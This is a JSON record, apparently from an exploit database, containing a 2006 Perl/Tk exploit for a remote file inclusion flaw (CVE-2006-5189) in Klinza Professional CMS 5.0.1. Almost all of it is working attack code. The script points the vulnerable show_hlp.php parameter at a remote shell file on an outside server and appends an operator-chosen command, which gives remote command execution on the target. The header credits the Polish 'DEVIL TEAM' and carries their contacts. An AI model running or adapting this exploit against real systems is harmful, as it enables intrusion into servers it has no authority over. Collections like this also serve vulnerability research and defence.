{
  "id": "2472",
  "title": "Klinza Professional CMS 5.0.1 - &#039;show_hlp.php&#039; File Inclusion",
  "cve": "CVE-2006-5189",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n#:::::::::  :::::::::: :::     ::: ::::::::::: :::        \r\n#:+:    :+: :+:        :+:     :+:     :+:     :+:        \r\n#+:+    +:+ +:+        +:+     +:+     +:+     +:+        \r\n#+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        \r\n#+#+    +#+ +#+         +#+   +#+      +#+     +#+        \r\n##+#    #+# #+#          #+#+#+#       #+#     #+#        \r\n##########  ##########     ###     ########### ########## \r\n#::::::::::: ::::::::::     :::     ::::    ::::  \r\n#    :+:     :+:          :+: :+:   +:+:+: :+:+:+ \r\n#    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ \r\n#    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ \r\n#    +#+     +#+        +#+     +#+ +#+       +#+ \r\n#    #+#     #+#        #+#     #+# #+#       #+# \r\n#    ###     ########## ###     ### ###       ### \r\n#\t\r\n#\t\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#- Klinza Professional CMS <= 5.0.1 (show_hlp.php) Remote File Include Exploit\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#- [Script name: Klinza Professional CMS 5.0.1\r\n#- [Script site: http://sourceforge.net/project/showfiles.php?group_id=121246\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#-          Find by: Kacper (a.k.a Rahim)\r\n#+\r\n#-    DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n#+\r\n#-          Contact: kacper1964@yahoo.pl\r\n#-                        or\r\n#-           http://www.rahim.webd.pl/\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#- Special Greetz: DragonHeart ;-)\r\n#- Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus\r\n#-                 SkD, nukedclx, Ramzes\r\n#-\r\n#- Greetz for all users DEVIL TEAM IRC Channel !!\r\n#!@ Przyjazni nie da sie zamienic na marne korzysci @!\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n#+\r\n#-            Z Dedykacja dla osoby,\r\n#-         bez ktorej nie mogl bym zyc...\r\n#-           K.C:* J.M (a.k.a Magaja)\r\n#+\r\n#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nuse Tk;\r\nuse Tk::DialogBox;\r\nuse LWP::UserAgent;\r\n\r\n\r\n$mw = new MainWindow(title => \"DEVIL TEAM :: Klinza Professional CMS <= 5.0.1 (show_hlp.php) Remote File Include Exploit :: by Kacper ;-)  \" );\r\n\r\n$mw->geometry ( '500x300' ) ;\r\n$mw->resizable(0,0);\r\n\r\n\r\n$mw->Label(-text => 'Klinza Professional CMS <= 5.0.1 (show_hlp.php) Remote File Include Exploit by Kacper', -font => '{Verdana} 7 bold',-foreground=>'blue')->pack();\r\n$mw->Label(-text => '')->pack();\r\n\r\n$fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;\r\n$fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;\r\n\r\n$url = 'http://www.site.com/[Klinza_path]/funzioni/lib/show_hlp.php?appl[APPL]=';\r\n$shell_path = 'http://server/shell.txt?';\r\n$cmd = 'ls -la';\r\n\r\n\r\n$fleft->Label ( -text => 'Script Path: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$url) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'Shell Path: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$shell_path) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fleft->Label ( -text => 'CMD: ', -font => '{Verdana} 8 bold') ->pack ( -side => \"top\" , -anchor => 'e' ) ;\r\n$fright->Entry ( -relief => \"groove\", -width => 35, -font => '{Verdana} 8', -textvariable => \\$cmd) ->pack ( -side => \"top\" , -anchor => 'w' ) ;\r\n\r\n$fright->Label( -text => ' ')->pack();\r\n$fleft->Label( -text => ' ')->pack();\r\n\r\n\r\n\r\n$fright->Button(-text    => 'Exploit Include Vulnerability',\r\n                -relief => \"groove\",\r\n                -width => '30',\r\n                -font => '{Verdana} 8 bold',\r\n                -activeforeground => 'red',\r\n                -command => \\&akcja\r\n               )->pack();\r\n\r\n\r\n$fright->Label( -text => ' ')->pack();\r\n$fright->Label( -text => 'Exploit coded by Kacper', -font => '{Verdana} 7')->pack();\r\n$fright->Label( -text => 'DEVIL TEAM :: The Best Polish Team', -font => '{Verdana} 7')->pack();\r\n$fright->Label( -text => 'http://www.rahim.webd.pl/', -font => '{Verdana} 7')->pack();\r\n\r\n\r\nMainLoop();\r\n\r\n\r\nsub akcja()\r\n{\r\n\r\n$InfoWindow=$mw->DialogBox(-title   => 'DEVIL TEAM :: Exploit by Kacper ;-) ', -buttons => [\"OK\"]);\r\n$InfoWindow->add('Label', -text => 'Enter to DEVIL TEAM IRC CHANNEL: 72.20.18.6:6667 #devilteam', -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => 'DEVIL TEAM SITE: http://www.rahim.webd.pl/', -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => 'Greetz For my friends ;-)', -font => '{Verdana} 8')->pack;\r\n$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;\r\n\r\nsystem(\"start $url$shell_path$cmd\");\r\n$InfoWindow->Show();\r\n}\r\n\r\n# milw0rm.com [2006-10-03]",
  "url": "https://www.exploit-db.com/exploits/2472"
}